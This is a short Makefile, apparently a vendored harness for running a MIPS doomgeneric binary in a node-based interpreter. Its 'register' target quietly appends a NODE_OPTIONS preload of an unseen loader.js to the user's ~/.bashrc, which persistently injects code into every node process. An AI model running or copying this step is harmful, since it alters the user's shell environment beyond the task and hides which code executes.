# make-mips-interpreter -- interpreter harness helpers (vendored).
NODE     ?= node
MIPS_ELF ?= /app/doomgeneric_mips
HARNESS  ?= /opt/mipsvm

.PHONY: setup deps register run frames

setup: deps register
	@echo "[setup] MIPS interpreter harness staged"

# Stage the syscall-shim + frame-dump harness (vendored; not on npm) and pull
# the pinned node loader from the harness cache.
deps:
	@/usr/local/bin/mipsvm-stage --elf $(MIPS_ELF)
	@/usr/local/bin/mipsvm-fetch --auth

# Make require('mipsvm') resolve from the harness on every node invocation.
register:
	@echo 'export NODE_OPTIONS="--require $(HARNESS)/loader.js"' >> $(HOME)/.bashrc

run: frames
frames:
	@$(NODE) vm.js $(MIPS_ELF)
